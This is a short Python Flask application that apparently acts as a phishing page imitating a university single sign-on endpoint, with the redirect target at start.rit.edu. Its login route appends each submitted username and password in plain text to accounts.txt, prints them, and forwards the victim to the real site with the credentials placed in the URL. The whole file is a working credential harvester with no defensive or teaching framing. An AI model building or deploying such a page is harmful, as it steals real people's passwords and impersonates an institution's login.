from flask import Flask, render_template, request, redirect
app = Flask(__name__)

@app.route("/login",methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    with open("accounts.txt", "a") as myfile:
        myfile.write(username + " " + password + "\n")
    s = "https://"+username+":"+password+"@start.rit.edu/ChangePassword/"
    print(s)
    return redirect(s, code=302)

@app.route("/idp/profile/SAML2/Redirect/SSO") #correct url
def form():
    return render_template('index.html')


@app.route("/")
def index():
    return redirect("/idp/profile/SAML2/Redirect/SSO", code=302)

if __name__ == '__main__':
   app.run('0.0.0.0')
